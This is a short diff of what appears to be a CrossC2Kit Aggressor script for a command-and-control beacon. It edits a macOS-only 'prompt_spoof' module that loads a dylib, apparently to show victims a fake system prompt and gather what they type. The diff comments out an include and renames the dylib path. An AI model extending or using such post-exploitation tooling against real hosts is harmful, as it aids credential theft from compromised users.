@@ -1,5 +1,5 @@
 
-include(script_resource("CrossC2Kit.cna"));
+# include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_prompt_spoof {
     blog($1, "\nUsage: cc2_prompt_spoof <process display name>\nEx:\n\tcc2_prompt_spoof osx English");
@@ -17,7 +17,7 @@ sub cc2_prompt_spoof {
     $os = lc(beacon_info($beaconid, "os"));
 
     if ('macos' isin $os) {
-        $loadlib = "gather/prompt/osx/prompt_spoof.dylib";
+        $loadlib = "gather/prompt/osx/cc2_prompt_spoof.dylib_bk";
     } else {
         berror($beaconid, "*[error]: Only supports osx.");
         printUsage_prompt_spoof($beaconid);
